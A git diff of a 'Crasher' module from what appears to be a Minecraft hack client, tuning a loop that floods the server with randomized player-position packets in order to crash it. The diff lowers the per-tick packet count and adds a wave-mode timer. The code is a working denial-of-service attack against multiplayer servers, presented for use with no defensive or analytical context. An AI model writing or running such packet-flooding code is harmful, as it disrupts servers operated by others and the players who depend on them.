@@ -4,8 +4,6 @@ import neko.module.Category;
 import neko.module.Module;
 import neko.utils.Utils;
 import net.minecraft.network.play.client.C03PacketPlayer;
-import net.minecraft.network.play.client.C0APacketAnimation;
-import net.minecraft.util.BlockPos;
 
 public class Crasher extends Module {
 	
@@ -29,12 +27,13 @@ public class Crasher extends Module {
 	}
 	
 	public void onUpdate() {
-		delay++;
+		if (wave)
+			delay++;
 		if (delay >= 200) {
 			delay = 0;
 		}
 		int spam = 0;
-		while (spam < 10000 && (Utils.limite ? Utils.limit > Utils.nbPack : true) && (wave ? delay <= 100 : true)) {
+		while (spam < 1000 && (Utils.limite ? Utils.limit > Utils.nbPack : true) && (wave ? delay <= 100 : true)) {
 			mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition((Math.random()*1000000-500000), (Math.random()*100+10), (Math.random()*1000000-500000), true));
 			++spam;
 		}
